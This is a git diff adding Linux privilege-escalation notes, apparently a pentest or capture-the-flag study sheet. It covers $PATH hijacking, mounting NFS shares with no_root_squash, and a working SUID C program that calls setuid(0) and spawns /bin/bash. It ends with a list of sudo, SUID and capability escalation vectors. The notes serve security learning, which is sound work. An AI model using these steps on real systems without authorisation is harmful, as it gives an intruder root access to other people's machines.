@@ -205,6 +205,92 @@ cat /etc/crontab
 We can hijack one of these processes configured in the `contab` if we can edit the `$PATH` environmental variable by putting an executable script with the same name as the one in the `crontab` file inside directory of our choice added to `$PATH`.
 
 
+### `$PATH`
+
+If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script
+```
+echo $PATH
+export PATH=/tmp:$PATH
+```
+
+1.What folders are located under $PATH
+2.Does your current user have write privileges for any of these folders?
+3.Can you modify $PATH?
+4.Is there a script/application you can start that will be affected by this vulnerability?
+
+### NFS Misconfiguration (`no_root_squash`)
+
+#### NFS Enumeration
+```
+showmount -e <ip_addr>
+```
+#### Mounting NFS
+```
+mkdir /mnt/share
+mount -t nfs <ip_addr>:/home /mnt/share -nolock
+or
+mount -o rw 10.0.2.12:/backups /mnt/share
+```
+- `-nolock` disables file locking
+- The purpose of file locking is to prevent data corruption or conflicts that can occur when multiple clients try to modify the same file simultaneously.
+- File locking is a mechanism used by applications to coordinate access to shared files. When a client process wants to modify a file, it can request a lock on that file.
+- With file locking enabled, if a client process has obtained an exclusive lock (write lock) on a file, other processes or clients attempting to access or modify the same file will be blocked until the lock is released.
+
+#### Root Squashing
+
+- Root squashing means that if the root user (UID 0) on a client machine accesses files on an NFS share, the NFS server will map this access to a less privileged user, often `nfsnobody` or another specified non-privileged user.
+- Root squashing is designed to prevent the potential security risks associated with allowing unrestricted root access to NFS shares
+- By default, NFS will change the root user to `nfsnobody` and "strip" any file from operating with root privileges.
+- When the `no_root_squash` option is used on an NFS share, it disables root squashing. This means that if the root user on a client accesses files on this share, the NFS server will allow the access with full root privileges
+
+- When you have write access (rw) to an NFS share that has `no_root_squash` enabled, you can potentially upload and execute malicious binaries with elevated privileges.
+- For example, an attacker could create an executable file with the SetUID (SUID) bit set on their local machine.
+- The attacker then copies this executable to the NFS share (which has `no_root_squash` enabled) where they have write permissions.
+- Because `no_root_squash` is active, the NFS server will not "strip" the SUID bit when the root user's privileges are mapped.
+- When the SUID executable is executed on the NFS client (target system), it runs with the effective privileges of the root user, potentially allowing the attacker to escalate their privileges on the target system.
+
+#### Creating an exploit with SUID bit
+
+Creating `payload.c`
+```
+#include <unistd.h> //setgid(),setuid()
+#include <stdlib.h> //system()
+int main(){
+	setgid(0);
+	setuid(0);
+	system("/bin/bash");
+	return 0;
+}
+```
+
+Compiling `payload.c` and set the binary `suid` bit
+```
+gcc -o payload payload.c
+chmod +s payload
+```
+
+### Privilege Escalation Vectors
+```
+[sudo] env_keep+=LD_PRELOAD
+[sudo] find
+[sudo] nano
+[sudo] less
+
+[suid] systemd
+[suid] base64
+
+[cap] vim cap_setuid+ep
+[cap] view cap_setuid+ep 
+
+Cron Jobs
+$PATH
+NFS misconfiguration (no_root_squash)
+```
+
+
+
+
+
 
 
 
